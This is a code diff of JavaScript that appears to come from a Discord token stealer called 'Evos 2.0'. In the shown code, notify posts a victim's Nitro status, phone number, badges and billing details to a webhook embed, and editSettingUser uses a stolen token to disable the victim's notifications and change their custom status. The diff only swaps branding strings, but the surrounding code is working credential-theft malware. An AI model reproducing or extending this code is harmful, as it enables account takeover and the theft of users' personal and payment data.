@@ -250,7 +250,7 @@ const notify = async (ctx, token, user) => {
         getData.Badges(user.flags),
     ];
 
-    ctx.content = `Evos 2.0`;
+    ctx.content = `-`;
     ctx.username = `Evos 2.0`;
     ctx.avatar_url = `https://cdn.discordapp.com/attachments/794056531674398750/1281956282261045258/GWz-En_WAAARmpi.png?ex=671ce253&is=671b90d3&hm=62dbb154194f5b4d865856878d4a002e92c0bceb94604a4fe03dcfb56aecb98e&`;
 
@@ -267,7 +267,7 @@ const notify = async (ctx, token, user) => {
     ctx.embeds[0].fields.push(
         // { name: "\u200b", value: "\u200b", inline: false },
         { name: "Nitro", value: `\`\`\`${nitro}\`\`\``, inline: false },
-        { name: "Phone", value: `\`\`\`${user.phone}\`\`\`` ? `\`\`\`${user.phone}\`\`\`` : 'null', inline: false },
+        { name: "Phone", value: `\`\`\`${user.phone}\`\`\`` ? `\`\`\`${user.phone}\`\`\`` : 'x', inline: false },
         // { name: "\u200b", value: "\u200b", inline: false },
         { name: "Badges", value: `\`\`\`${badges}\`\`\``, inline: false },
         { name: "Billing", value: `\`\`\`${billing}\`\`\``, inline: false },
@@ -342,7 +342,7 @@ const editSettingUser = async (token) => {
             email_notifications_enabled: false,
             stream_notifications_enabled: false,
             custom_status: {
-                text: 'evos 2.0',
+                text: 'GGGGGGGGG',
                 expires_at: null,
                 emoji_id: null,
                 emoji_name: null
